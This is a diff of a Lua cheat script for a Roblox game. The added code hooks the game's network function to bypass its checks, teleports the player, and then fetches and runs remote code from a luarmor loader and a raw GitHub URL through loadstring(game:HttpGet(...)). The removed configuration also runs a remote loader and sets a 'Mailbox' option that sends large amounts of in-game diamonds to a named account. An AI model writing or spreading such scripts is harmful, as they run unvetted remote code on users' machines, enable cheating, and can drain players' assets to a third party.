@@ -1,45 +1,61 @@
-script_key="TvFnXUnYUFoBGJhBmBcPJwyicsFBOfGj";
-Configs = {
-    MysticMine = {
-        ["Giant Chest"] = true,
-        ["Diamonds"] = true
-    },
-    CyberCavern = {
-        ["Giant Chest"] = false,
-        ["Diamonds"] = false
-    },
-    ParadiseCave = {
-        ["Diamonds"] = false
-    },
-    Farming = {
-        ["Pet Sending"] = "Single",
-        ["Auto Orbs"] = true,
-        ["Auto Lootbags"] = true
-    },
-    Fruits = {
-        ["Minimum Fruits"] = 10,
-        ["Maximum Fruits"] = 20,
-        ["Enabled"] = true
-    },
-    Boosts = {
-        ["Triple Server Damage"] = false,
-        ["Triple Damage"] = true
-    },
-    Webhooks = {
-        ["Webhook Url"] = "Your Wbehook Url",
-        ["Time Frame"] = 60
-    },
-    Mailbox = {
-        ["Recipient"] = "darktv_yt53", 
-        ["Minimum Diamonds"] = 50000000000, 
-        ["Enabled"] = true
-    },
-    Performance = {
-        ["Disable Orb Rendering"] = true,
-        ["Disable Lootbags"] = true,
-        ["Disable 3D Rendering"] = false,
-        ["Hide Username"] = false,
-        ["FPSCap"] = 60
-    }
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/21b86b12222bd279cbf3d0aa61d8c701.lua"))()
+local Library = require(game:GetService("ReplicatedStorage").Library)
+local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
+local Fire, Invoke = Network.Fire, Network.Invoke
+local old
+old = hookfunction(getupvalue(Fire, 1), function(...)
+	return true
+end)
+
+
+function TeleportToWorld(world, area)
+	Library.WorldCmds.Load(world)
+	wait(0.25)
+	local areaTeleport = Library.WorldCmds.GetMap().Teleports:FindFirstChild(area)
+	Library.Signal.Fire("Teleporting")
+	task.wait(0.25)
+	local Character = game.Players.LocalPlayer.Character
+	local Humanoid = Character.Humanoid
+	local HumanoidRootPart = Character.HumanoidRootPart
+	Character:PivotTo(areaTeleport.CFrame +
+		areaTeleport.CFrame.UpVector * (Humanoid.HipHeight + HumanoidRootPart.Size.Y / 2))
+	Library.Network.Fire("Performed Teleport", area)
+	task.wait(0.25)
+end
+
+wait(10)
+function Teleport(x, y, z)
+	local character = game:GetService("Players").LocalPlayer.Character or
+		game:GetService("Players").LocalPlayer.CharacterAdded:Wait()
+	local humanoid = character:WaitForChild("Humanoid")
+	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+	CurrentPosition = character:WaitForChild("HumanoidRootPart").CFrame
+	task.wait()
+
+	humanoidRootPart.CFrame = CFrame.new(x, y, z)
+end
+
+
+local function create_platform(x, y, z)
+	local p = Instance.new("Part")
+	p.Anchored = true
+	p.Name = "plat"
+	p.Position = Vector3.new(x, y, z)
+	p.Size = Vector3.new(10, 1, 10)
+	p.Parent = game.Workspace
+end
+
+
+		TeleportToWorld("Pixel", "Pixel Vault")
+		create_platform(3587.14, -38, 2456.29)
+
+		task.wait(0.1)
+
+		Teleport(3587.14, -35, 2456.29)
+wait(30)
+
+script_key="vOwThXUrdytWYVEOBafxIzDDSoZEqSQo";
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fc715fb43902af268c335a5c7269be5e.lua"))()
+
+wait(150)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/GrayArea"))()
+game:GetService("RunService"):Set3dRenderingEnabled(false)
